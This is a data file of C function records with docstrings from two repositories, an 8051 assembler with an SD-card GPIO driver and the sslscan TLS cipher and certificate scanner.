{"docstring": "/* ----------------------------------------------------------------------\n * \"tdr\" format. For tdr's 68008 system. Generates a\n * script file readable by a debugger.\n *      [addr] : [byte] [byte] ..\n *\n * arg: This is a number in decimal which specifies\n *      the offset, -Ftdr -A0000\n *\n *      These options specifies the tdr format, with an argument\n *      of 0. This becomes the offset used in generating the\n *      script file. The default if no A is present is 0x10000.\n * \n */\n", "func_signal": "static int open_tdr(const char *file, const char *ftype, const char *arg)", "code": "{\n\tif (file == NULL) fout = stdout;\n\telse fout = fopen(file,\"w\");\n\n\tif( fout == NULL ) {\n\t\tmesg_f(\"Cannot open %s for writing.\\n\",file);\n\t\treturn -1;\n\t}\n\tif (arg) {\n\t\toffset = atoi(arg);\n\t} else {\n\t\toffset = 0x10000;\n\t}\n\treturn 0;\n}", "path": "src\\as31\\emitter.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/**\n * crc7 - update the CRC7 for the data buffer\n * @crc:     previous CRC7 value\n * @buffer:  data pointer\n * @len:     number of bytes in the buffer\n * Context: any\n *\n * Returns the updated CRC7 value.\n */\n", "func_signal": "uint8_t crc7(const uint8_t *buffer, int len)", "code": "{\n\tuint8_t crc = 0;\n        while (len--)\n                crc = crc7_byte(crc, *buffer++);\n        return crc;\n}", "path": "src\\ax215\\crc-16.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* Copy to YYRES the contents of YYSTR after stripping away unnecessary\n   quotes and backslashes, so that it's suitable for yyerror.  The\n   heuristic is that double-quoting is unnecessary unless the string\n   contains an apostrophe, a comma, or backslash (other than\n   backslash-backslash).  YYSTR is taken from yytname.  If YYRES is\n   null, do not copy; instead, return the length of what the result\n   would have been.  */\n", "func_signal": "static YYSIZE_T\nyytnamerr (char *yyres, const char *yystr)", "code": "{\n  if (*yystr == '\"')\n    {\n      YYSIZE_T yyn = 0;\n      char const *yyp = yystr;\n\n      for (;;)\n\tswitch (*++yyp)\n\t  {\n\t  case '\\'':\n\t  case ',':\n\t    goto do_not_strip_quotes;\n\n\t  case '\\\\':\n\t    if (*++yyp != '\\\\')\n\t      goto do_not_strip_quotes;\n\t    /* Fall through.  */\n\t  default:\n\t    if (yyres)\n\t      yyres[yyn] = *yyp;\n\t    yyn++;\n\t    break;\n\n\t  case '\"':\n\t    if (yyres)\n\t      yyres[yyn] = '\\0';\n\t    return yyn;\n\t  }\n    do_not_strip_quotes: ;\n    }\n\n  if (! yyres)\n    return yystrlen (yystr);\n\n  return yystpcpy (yyres, yystr) - yyres;\n}", "path": "src\\as31\\parser.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * \"byte\" format.\n *\tLike \"tdr\" but each byte is on a line by itself.\n *\tThis is nice for debugging. No -A is used.\n */\n", "func_signal": "static int open_byte(const char *file, const char *ftype, const char *arg)", "code": "{\n\tif (file == NULL) fout = stdout;\n\telse fout = fopen(file,\"w\");\n\n\tif( fout == NULL ) {\n\t\tmesg_f(\"Cannot open %s for writing.\\n\", file);\n\t\treturn -1;\n\t}\n\treturn 0;\n}", "path": "src\\as31\\emitter.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * unget_ch:\n *\tUnget a character and move lineptr back by one.\n */\n", "func_signal": "void unget_ch(int c)", "code": "{\n\tungetc(c,stdin);\n\tif( lineptr > line )\n\t\tlineptr--;\n}", "path": "src\\as31\\lexer.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * get_ch:\n *\tGet a character from stdin, place char in line[]\n */\n", "func_signal": "int get_ch(void)", "code": "{\n\tregister int c;\n\n\tc = getchar();\n\tif (last_token_len >=0 && last_token_len < 254 &&\n\t   c != EOF && (last_token_len > 0 || !isspace(c))) {\n\t\tlast_token[last_token_len++] = c;\n\t}\n\tif( c != EOF && lineptr - line < sizeof(line) )\n\t\t*lineptr++ = c;\n\treturn(c);\n}", "path": "src\\as31\\lexer.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "// Wait for the start bit.\n// Return the number of clock cycles we've waited.\n", "func_signal": "int rcvr_mmc_dat0_start(struct sd_state *state, int tries)", "code": "{\n    int attempts = 0;\n    while (attempts < tries && gpio_get_value(state->dat0)) {\n        attempts++;\n        CK_L(); CK_H();\n        if (!gpio_get_value(state->dat0))\n            return attempts;\n    }\n    return -1;\n}", "path": "src\\ax215\\sd.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * padline:\n *\tThis routine returns a new string, which is equivilant to\n *\t'line' except that all tabs have been expanded to spaces, and\n *\tthe total length has been truncated to 60 chars.\n */\n", "func_signal": "char *padline(char *line)", "code": "{\n\tstatic char newline[61];\n\tchar *p1;\n\tint pos=0,nxtpos;\n\n\tfor(p1=line; pos<sizeof(newline)-1 && *p1; p1++ ) {\n\t\tif( *p1 == '\\t' ) {\n\t\t\tnxtpos = pos+8-pos%8;\n\t\t\twhile(pos<sizeof(newline)-1 && pos <= nxtpos)\n\t\t\t\tnewline[pos++] = ' ';\n\t\t} else if( *p1 != '\\n' )\n\t\t\tnewline[pos++]= *p1;\n\t}\n\tnewline[pos] = '\\0';\n\treturn(newline);\n}", "path": "src\\as31\\parser.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * gen* routines:\n *\tPlace information into the bytebuf[] array, and also\n *\tcall emitbyte with the byte.\n *\n */\n", "func_signal": "void genbyte(int b)", "code": "{\n\tif( bytecount < sizeof(bytebuf) )\n\t\tbytebuf[bytecount++] = b;\n\temitbyte(b);\n}", "path": "src\\as31\\parser.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/*-----------------------------------------------------------------------*/\n/* Deselect the card and release SPI bus                                 */\n/*-----------------------------------------------------------------------*/\n", "func_signal": "void sd_end (\n    struct sd_state *state\n)", "code": "{\n    uint8_t d;\n\n    CS_H();\n    rcvr_spi(state, &d, 1); /* Dummy clock (force DO hi-z for multiple slave SPI) */\n}", "path": "src\\ax215\\sd.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/*-----------------------------------------------------------------------*/\n/* Miscellaneous Functions                                               */\n/*-----------------------------------------------------------------------*/\n", "func_signal": "int sd_get_csd(struct sd_state *state, uint8_t *csd)", "code": "{\n    int ret;\n    bzero(csd, 16);\n    ret = send_cmd(state, CMD9, 0);\n    if (ret)\n        return ret;\n    return !rcvr_datablock(state, csd, 16);\n}", "path": "src\\ax215\\sd.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/*-----------------------------------------------------------------------*/\n/* Initialize Disk Drive                                                 */\n/*-----------------------------------------------------------------------*/\n", "func_signal": "struct sd_state *sd_init(uint32_t miso, uint32_t mosi,\n                         uint32_t clk, uint32_t cs,\n                         uint32_t dat1, uint32_t dat2,\n                         uint32_t power)", "code": "{\n    struct sd_state *state;\n\n\n    state = malloc(sizeof(struct sd_state));\n    if (!state) {\n        perror(\"Couldn't allocate memory for sd_state\");\n        return NULL;\n    }\n\n    state->miso = miso;\n    state->mosi = mosi;\n    state->clk = clk;\n    state->cs = cs;\n    state->dat1 = dat1;\n    state->dat2 = dat2;\n    state->power = power;\n\n    if (gpio_export(state->miso)) {\n        perror(\"Unable to export DATA IN pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->miso, GPIO_IN);\n\n\n    if (gpio_export(state->mosi)) {\n        perror(\"Unable to export DATA OUT pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->mosi, GPIO_OUT);\n    gpio_set_value(state->mosi, 1);\n\n\n    if (gpio_export(state->clk)) {\n        perror(\"Unable to export CLK pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->clk, GPIO_OUT);\n    gpio_set_value(state->clk, 1);\n\n\n    /* Grab the chip select pin and deassert it */\n    if (gpio_export(state->cs)) {\n        perror(\"Unable to export CS pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->cs, GPIO_OUT);\n    gpio_set_value(state->cs, CS_DESEL);\n\n    /* Power down the card */\n    if (gpio_export(state->power)) {\n        perror(\"Unable to export power pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->power, GPIO_OUT);\n    gpio_set_value(state->power, SD_OFF);\n\n\n\n    if (gpio_export(state->dat1)) {\n        perror(\"Unable to export DAT1 pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->dat1, GPIO_OUT);\n    gpio_set_value(state->dat1, 0);\n\n\n    if (gpio_export(state->dat2)) {\n        perror(\"Unable to export DAT2 pin\");\n        sd_deinit(&state);\n        return NULL;\n    }\n    gpio_set_direction(state->dat2, GPIO_OUT);\n    gpio_set_value(state->dat2, 0);\n\n    return state;\n}", "path": "src\\ax215\\sd.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* Copy into YYRESULT an error message about the unexpected token\n   YYCHAR while in state YYSTATE.  Return the number of bytes copied,\n   including the terminating null byte.  If YYRESULT is null, do not\n   copy anything; just return the number of bytes that would be\n   copied.  As a special case, return 0 if an ordinary \"syntax error\"\n   message will do.  Return YYSIZE_MAXIMUM if overflow occurs during\n   size calculation.  */\n", "func_signal": "static YYSIZE_T\nyysyntax_error (char *yyresult, int yystate, int yychar)", "code": "{\n  int yyn = yypact[yystate];\n\n  if (! (YYPACT_NINF < yyn && yyn <= YYLAST))\n    return 0;\n  else\n    {\n      int yytype = YYTRANSLATE (yychar);\n      YYSIZE_T yysize0 = yytnamerr (0, yytname[yytype]);\n      YYSIZE_T yysize = yysize0;\n      YYSIZE_T yysize1;\n      int yysize_overflow = 0;\n      enum { YYERROR_VERBOSE_ARGS_MAXIMUM = 5 };\n      char const *yyarg[YYERROR_VERBOSE_ARGS_MAXIMUM];\n      int yyx;\n\n# if 0\n      /* This is so xgettext sees the translatable formats that are\n\t constructed on the fly.  */\n      YY_(\"syntax error, unexpected %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s or %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s or %s or %s\");\n      YY_(\"syntax error, unexpected %s, expecting %s or %s or %s or %s\");\n# endif\n      char *yyfmt;\n      char const *yyf;\n      static char const yyunexpected[] = \"syntax error, unexpected %s\";\n      static char const yyexpecting[] = \", expecting %s\";\n      static char const yyor[] = \" or %s\";\n      char yyformat[sizeof yyunexpected\n\t\t    + sizeof yyexpecting - 1\n\t\t    + ((YYERROR_VERBOSE_ARGS_MAXIMUM - 2)\n\t\t       * (sizeof yyor - 1))];\n      char const *yyprefix = yyexpecting;\n\n      /* Start YYX at -YYN if negative to avoid negative indexes in\n\t YYCHECK.  */\n      int yyxbegin = yyn < 0 ? -yyn : 0;\n\n      /* Stay within bounds of both yycheck and yytname.  */\n      int yychecklim = YYLAST - yyn + 1;\n      int yyxend = yychecklim < YYNTOKENS ? yychecklim : YYNTOKENS;\n      int yycount = 1;\n\n      yyarg[0] = yytname[yytype];\n      yyfmt = yystpcpy (yyformat, yyunexpected);\n\n      for (yyx = yyxbegin; yyx < yyxend; ++yyx)\n\tif (yycheck[yyx + yyn] == yyx && yyx != YYTERROR)\n\t  {\n\t    if (yycount == YYERROR_VERBOSE_ARGS_MAXIMUM)\n\t      {\n\t\tyycount = 1;\n\t\tyysize = yysize0;\n\t\tyyformat[sizeof yyunexpected - 1] = '\\0';\n\t\tbreak;\n\t      }\n\t    yyarg[yycount++] = yytname[yyx];\n\t    yysize1 = yysize + yytnamerr (0, yytname[yyx]);\n\t    yysize_overflow |= (yysize1 < yysize);\n\t    yysize = yysize1;\n\t    yyfmt = yystpcpy (yyfmt, yyprefix);\n\t    yyprefix = yyor;\n\t  }\n\n      yyf = YY_(yyformat);\n      yysize1 = yysize + yystrlen (yyf);\n      yysize_overflow |= (yysize1 < yysize);\n      yysize = yysize1;\n\n      if (yysize_overflow)\n\treturn YYSIZE_MAXIMUM;\n\n      if (yyresult)\n\t{\n\t  /* Avoid sprintf, as that infringes on the user's name space.\n\t     Don't have undefined behavior even if the translation\n\t     produced a string with the wrong number of \"%s\"s.  */\n\t  char *yyp = yyresult;\n\t  int yyi = 0;\n\t  while ((*yyp = *yyf) != '\\0')\n\t    {\n\t      if (*yyp == '%' && yyf[1] == 's' && yyi < yycount)\n\t\t{\n\t\t  yyp += yytnamerr (yyp, yyarg[yyi++]);\n\t\t  yyf += 2;\n\t\t}\n\t      else\n\t\t{\n\t\t  yyp++;\n\t\t  yyf++;\n\t\t}\n\t    }\n\t}\n      return yysize;\n    }\n}", "path": "src\\as31\\parser.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* the parser, lexer and other stuff that actually do the */\n/* assembly will call to these two functions to report any */\n/* errors or warning.  error() calls exit() in the command */\n/* line version, but the abort_asap flag was added, and the */\n/* parser check it at the end of every line */\n", "func_signal": "void error(const char *fmt, ...)", "code": "{\n\tva_list args;\n\tchar buf[2048];\n\tint len;\n\n\tabort_asap++;\n        fatal++;\n\tva_start(args, fmt);\n\n\tlen = snprintf(buf, sizeof(buf), \"Error, line %d, \", lineno);\n\tlen += vsnprintf(buf + len, sizeof(buf) - len, fmt, args);\n\tsnprintf(buf + len, sizeof(buf) - len, \".\\n\");\n\tmesg(buf);\n}", "path": "src\\as31\\run.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* ----------------------------------------------------------------------\n * dumplist:\n *\tOutputs the current location counter, bytebuf[] array, and\n *\tthe string 'txt' to the listing file.\n *\tThis routine is called for every source line encountered in the\n *\tsource file. (Only in pass 2, and if listing is turned on).\n *\n */\n", "func_signal": "void dumplist(char *txt, int show)", "code": "{\n\tint i,j;\n\n\tfprintf(listing,show?\"%04lX: \":\"      \",lc);\n\n\tj=0;\n\tfor(i=0; i<bytecount; i++ ) {\n\t\tfprintf(listing,\"%02X \",bytebuf[i]);\n\t\tif( ++j >= 4 ) {\n\t\t\tj = 0;\n\t\t\tfprintf(listing,\"\\n      \");\n\t\t}\n\t}\n\twhile(++j <= 4)\n\t\tfprintf(listing,\"   \");\n\n\tfprintf(listing,\" %s\\n\",padline(txt));\n}", "path": "src\\as31\\parser.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* b0:MMC, b1:SDv1, b2:SDv2, b3:Block addressing */\n", "func_signal": "static int init_port(struct sd_state *state)", "code": "{\n    gpio_set_value(state->power, SD_OFF);\n    gpio_set_value(state->mosi, 0);\n    gpio_set_value(state->clk, 0);\n    gpio_set_value(state->cs, 0);\n    gpio_set_value(state->dat1, 0);\n    gpio_set_value(state->dat2, 0);\n\n    gpio_set_direction(state->clk, GPIO_OUT);\n\n    eim_set(fpga_w_nand_pwr_ctl, 0);\n    usleep(140000);\n    CS_H();\n\n    eim_set(fpga_w_nand_pwr_ctl, 1);\n\n    gpio_set_value(state->power, SD_ON);\n    usleep(8000);\n    return 0;\n}", "path": "src\\ax215\\sd.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/*-----------------------------------------------------------------------*/\n/* Get Disk Status                                                       */\n/*-----------------------------------------------------------------------*/\n", "func_signal": "int disk_status (\n    struct sd_state *state\n)", "code": "{\n    int s;\n    uint8_t d;\n\n\n    /* Check if the card is kept initialized */\n    s = Stat;\n    if (!(s & STA_NOINIT)) {\n        if (send_cmd(state, CMD13, 0))  /* Read card status */ {\n            s = STA_NOINIT;\n            fprintf(stderr, \"Card status returned STA_NOINIT\\n\");\n        }\n        rcvr_spi(state, &d, 1);     /* Receive following half of R2 */\n        sd_end(state);\n    }\n    Stat = s;\n\n    return s;\n}", "path": "src\\ax215\\sd.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/* when there is a parse error, yyparse should call here to */\n/* advance to the end of the current line, so we can continue */\n/* parsing the rest of the file */\n", "func_signal": "int seek_eol(void)", "code": "{\n\tint c;\n\n\tlast_token_len = -1;\n\tdo {\n\t\tc = get_ch();\n\t} while (c != '\\n' && c != EOF);\n\tif (c == '\\n') {\n\t\tunget_ch(c);\n\t\treturn 1;\n\t}\n\treturn 0;\n}", "path": "src\\as31\\lexer.c", "repo_name": "xobs/ax2xx-code", "stars": 85, "license": "None", "language": "c", "size": 664}
{"docstring": "/**\n * Create python client result object\n */\n", "func_signal": "PyObject *new_client_result(struct sslCheckOptions *options)", "code": "{\n\tPyObject *result;\n\tPyObject *tmp;\n\tPyObject *tmp2;\n\tchar method_name[32];\n\tint method_id;\n\n\tresult = PyDict_New();\n\n\t// Add cipher list\n\ttmp = PyList_New(0);\n\tstruct sslCipher *cipher;\n\tcipher = options->ciphers;\n\twhile (cipher != NULL) {\n\t\t// ToDo: add more information\n\t\tmethod_id = get_ssl_method_name(cipher->sslMethod, method_name, sizeof(method_name));\n\t\ttmp2 = Py_BuildValue(\"{sisisiszss}\",\n\t\t\t\"bits\", cipher->bits,\n\t\t\t\"algorithm_bits\", cipher->alg_bits,\n\t\t\t\"method.id\", method_id,\n\t\t\t\"method.name\", NULL,\n\t\t\t\"name\", cipher->name\n\t\t);\n\t\tif(method_id > 0)\n\t\t\tPyDict_SetItemString(tmp2, \"method.name\", PyUnicode_FromString(method_name));\n\n\t\tPyList_Append(tmp, tmp2);\n\t\tcipher = cipher->next;\n\t}\n\tPyDict_SetItemString(result, \"ciphers\", tmp);\n\n\treturn result;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Get a ssl method pointer by internal ID\n * @param id Internal ID\n * @return SSL method pointer\n */\n", "func_signal": "const SSL_METHOD *get_ssl_method_by_id(uint_fast8_t id)", "code": "{\n#ifndef OPENSSL_NO_SSL2\n\tif (id == ssl_v2)\n\t\treturn SSLv2_client_method();\n#endif // #ifndef OPENSSL_NO_SSL2\n\tif (id == ssl_v3)\n\t\treturn SSLv3_client_method();\n\n\tif (id == tls_v10)\n\t\treturn TLSv1_client_method();\n\n#if OPENSSL_VERSION_NUMBER >= 0x1000008fL || OPENSSL_VERSION_NUMBER >= 0x1000100fL\n\tif (id == tls_v11)\n\t\treturn TLSv1_1_client_method();\n\n\tif (id == tls_v12)\n\t\treturn TLSv1_2_client_method();\n#endif // #if OPENSSL_VERSION_NUMBER >= 0x1000008fL || OPENSSL_VERSION_NUMBER >= 0x1000100fL\n\n\treturn NULL;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Run all tests\n */\n", "func_signal": "int run_tests(struct sslCheckOptions *options)", "code": "{\n\tFILE *fp;\n\tchar line[1024];\n\tint status = 0;\n\n\tif(!init_probe(options))\n\t\treturn false;\n\n\tPyObject *result_list = PyList_New(0);\n\n\tif (options->targets != NULL) {\n\t\tif (fileExists(options->targets) == false) {\n\t\t\tprintf(\"%sERROR: Targets file %s does not exist.%s\\n\", COL_RED, options->targets, RESET);\n\t\t\t// ToDo:\n\t\t\treturn 1;\n\t\t}\n\n\t\tfp = fopen(options->targets, \"r\");\n\t\tif (fp == NULL) {\n\t\t\tprintf(\"%sERROR: Could not open targets file %s.%s\\n\", COL_RED, options->targets, RESET);\n\t\t\t// ToDo:\n\t\t\treturn 1;\n\t\t}\n\n\t\treadLine(fp, line, sizeof(line));\n\t\twhile (feof(fp) == 0) {\n\t\t\tif (strlen(line) != 0) {\n\t\t\t\t// Get host...\n\t\t\t\tparseHostString(line, options);\n\n\t\t\t\t// Test the host...\n\t\t\t\toptions->host_result = new_host_result();\n\t\t\t\tstatus = test_host(options);\n\t\t\t\tif(!status) {\n\t\t\t\t\t// print error and continue\n\t\t\t\t\tprintf(\"%sERROR: Scan has failed for host %s\\n%s\", COL_RED, options->host, RESET);\n\t\t\t\t} else {\n\t\t\t\t\tPyList_Append(result_list, options->host_result);\n\t\t\t\t}\n\t\t\t}\n\t\t\treadLine(fp, line, sizeof(line));\n\t\t}\n\n\t} else {\n\t\toptions->host_result = new_host_result();\n\t\tstatus = test_host(options);\n\t\tif(!status) {\n\t\t\tprintf(\"%sERROR: Scan has failed for host %s\\n%s\", COL_RED, options->host, RESET);\n\t\t\t// ToDo:\n\t\t\treturn 1;\n\t\t} else {\n\t\t\tPyList_Append(result_list, options->host_result);\n\t\t}\n\t}\n\n\t// ToDo: Clean up\n\tPyObject *client_result = new_client_result(options);\n\tif (options->py_output_handler == NULL) {\n\t\tprintf(\"Error: No python output handler found\");\n\t\t// ToDo:\n\t\treturn 1;\n\t}\n\tPyObject *py_func = PyObject_GetAttrString(options->py_output_handler, \"run\");\n\tPyObject *py_args = PyTuple_New(2);\n\tPyTuple_SetItem(py_args, 0, client_result);\n\tPyTuple_SetItem(py_args, 1, result_list);\n\tPyObject *py_result = PyObject_CallObject(py_func, py_args);\n\tif(py_result == NULL) {\n\t\tPyErr_Print();\n\t}\n\n\tif(!finalize_probe(options))\n\t\treturn false;\n\n\treturn 0;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Create python server result object\n */\n", "func_signal": "PyObject *new_host_result()", "code": "{\n\tPyObject *tmp;\n\ttmp = PyDict_New();\n\tPyDict_SetItemString(tmp, \"ciphers\", (PyObject *)PyList_New(0));\n\tPyDict_SetItemString(tmp, \"ciphers.default\", (PyObject *)PyDict_New());\n\tPyDict_SetItemString(tmp, \"certificate.blob\", (PyObject *)Py_None);\n\treturn tmp;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "// File Exists\n", "func_signal": "int fileExists(char *fileName)", "code": "{\n#if PLAT_WINDOWS\n\treturn _access(fileName, 0) == 0;\n#else\n\treturn access(fileName, R_OK) == 0;\n#endif\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Wrapper to call a python function. It prepares all required objects and handles errors.\n *\n * @param py_object The object\n * @param name The name of the function to call\n * @param py_args Arguments to pass to the python function. NULL if nothing to pass.\n * @param py_result Pointer to a result object. NULL if not used.\n * @return 0 = no errors; 1 = an error occurred\n */\n", "func_signal": "int py_call_function(PyObject *py_obj, const char *name, PyObject *py_args, PyObject **py_result)", "code": "{\n\tPyObject *py_func;\n\tPyObject *py_tmp;\n\n\tpy_func = PyObject_GetAttrString(py_obj, name);\n\tif (py_func == NULL) {\n\t\tPyErr_Print();\n\t\treturn 1;\n\t}\n\n\tif (py_args == NULL)\n\t\tpy_args = PyTuple_New(0);\n\n\tpy_tmp = PyObject_CallObject(py_func, py_args);\n\n\tif (py_tmp == NULL) {\n\t\tPyErr_Print();\n\t\treturn 1;\n\t}\n\n\tif (py_result != NULL) {\n\t\t*py_result = py_tmp;\n\t}\n\n\treturn 0;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Callback to capture SSL alerts\n */\n", "func_signal": "void callback_ssl_info(const SSL *s, int where, int ret)", "code": "{\n\tif (!(where & SSL_CB_ALERT))\n\t\treturn;\n\tstruct ssl_alert_info *p = malloc(sizeof(struct ssl_alert_info));\n\tp->ret = ret;\n\tp->next = NULL;\n\tif (g_ssl_alert_queue == NULL) {\n\t\tg_ssl_alert_queue = p;\n\t\treturn;\n\t}\n\tstruct ssl_alert_info *t = g_ssl_alert_queue;\n\twhile (t->next != NULL)\n\t\tt = t->next;\n\tt->next = p;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "// Get certificate...\n", "func_signal": "int get_certificate(struct sslCheckOptions *options, const SSL *ssl)", "code": "{\n\tif (options->host_state.extracted_information & SSLSCAN_HOST_INFO_CERTIFICATE)\n\t\treturn true;\n\n\t// Variables...\n\tX509 *x509Cert = NULL;\n\tlong verify_status = 0;\n\n\t// Get Certificate...\n\tx509Cert = SSL_get_peer_certificate(ssl);\n\tif (x509Cert == NULL) {\n\t\tprintf(\"    Unable to parse certificate\\n\");\n\t\treturn false;\n\t}\n\n\tPyObject *py_module = PyImport_ImportModule(\"sslscan.ssl\");\n\tif (py_module == NULL) {\n\t\tPyErr_Print();\n\t\t// ToDo:\n\t\treturn false;\n\t}\n\n\tPyObject *py_func = PyObject_GetAttrString(py_module, \"X509\");\n\tif(py_func == NULL) {\n\t\tPyErr_Print();\n\t\t// ToDo:\n\t\treturn false;\n\t}\n\n\tPyObject *py_args = PyTuple_New(1);\n\tPyTuple_SetItem(py_args, 0, PyCapsule_New((void*) x509Cert, \"x509\", NULL));\n\tPyObject *py_result = PyObject_CallObject(py_func, py_args);\n\tif(py_result == NULL) {\n\t\tPyErr_Print();\n\t\t// ToDo:\n\t\treturn false;\n\t}\n\n\tPyDict_SetItemString(options->host_result, \"certificate.x509\", py_result);\n\n\t// Verify Certificate...\n\tverify_status = SSL_get_verify_result(ssl);\n\tif (verify_status == X509_V_OK) {\n\t\tPyDict_SetItemString(options->host_result, \"certificate.verify.status\", PyLong_FromLong(true));\n\t\tPyDict_SetItemString(options->host_result, \"certificate.verify.error_message\", PyUnicode_FromString(\"\"));\n\t} else {\n\t\tPyDict_SetItemString(options->host_result, \"certificate.verify.status\", PyLong_FromLong(false));\n\t\tPyDict_SetItemString(options->host_result, \"certificate.verify.error_message\", PyUnicode_FromString(X509_verify_cert_error_string(verify_status)));\n\t}\n\n\toptions->host_state.extracted_information |= SSLSCAN_HOST_INFO_CERTIFICATE;\n\n\treturn true;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Free alert queue. Must be called before setting a callback function.\n */\n", "func_signal": "int alert_queue_free()", "code": "{\n\tstruct ssl_alert_info *p1, *p2;\n\tp1 = g_ssl_alert_queue;\n\twhile (p1 != NULL) {\n\t\tp2 = p1->next;\n\t\tfree(p1);\n\t\tp1 = p2;\n\t}\n\tg_ssl_alert_queue = NULL;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Try to free all alloceted  memory\n */\n", "func_signal": "int finalize_probe(struct sslCheckOptions *options)", "code": "{\n\tstruct sslCipher *cipher;\n\n\t// Free Structures\n\twhile (options->ciphers != NULL) {\n\t\tcipher = options->ciphers->next;\n\t\tfree(options->ciphers);\n\t\toptions->ciphers = cipher;\n\t}\n\treturn true;\n}", "path": "src\\probe.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
{"docstring": "/**\n * Get the name of the ssl method\n * @param ssl_method The SSL method\n * @param name Pointer to store the name\n * @param len Max length in bytes to store name\n * @return Internal method ID or 0 on failure\n */\n", "func_signal": "int get_ssl_method_name(const SSL_METHOD *ssl_method, char *name, size_t len)", "code": "{\n\tlen--;\n\tname[len] = '\\0';\n#ifndef OPENSSL_NO_SSL2\n\tif (ssl_method == SSLv2_client_method()) {\n\t\tstrncpy(name, \"SSLv2\", len);\n\t\treturn 1;\n\t}\n#endif // #ifndef OPENSSL_NO_SSL2\n\tif (ssl_method == SSLv3_client_method()) {\n\t\tstrncpy(name, \"SSLv3\", len);\n\t\treturn 2;\n\t}\n\n\tif (ssl_method == TLSv1_client_method()) {\n\t\tstrncpy(name, \"TLSv1\", len);\n\t\treturn 3;\n\t}\n\n#if OPENSSL_VERSION_NUMBER >= 0x1000008fL || OPENSSL_VERSION_NUMBER >= 0x1000100fL\n\tif (ssl_method == TLSv1_1_client_method()) {\n\t\tstrncpy(name, \"TLS11\", len);\n\t\treturn 4;\n\t}\n\n\tif (ssl_method == TLSv1_2_client_method())\n\t{\n\t\tstrncpy(name, \"TLS12\", len);\n\t\treturn 5;\n\t}\n#endif // #if OPENSSL_VERSION_NUMBER >= 0x1000008fL || OPENSSL_VERSION_NUMBER >= 0x1000100fL\n\n\treturn 0;\n}", "path": "src\\helper.c", "repo_name": "DinoTools/sslscan", "stars": 89, "license": "gpl-3.0", "language": "c", "size": 557}
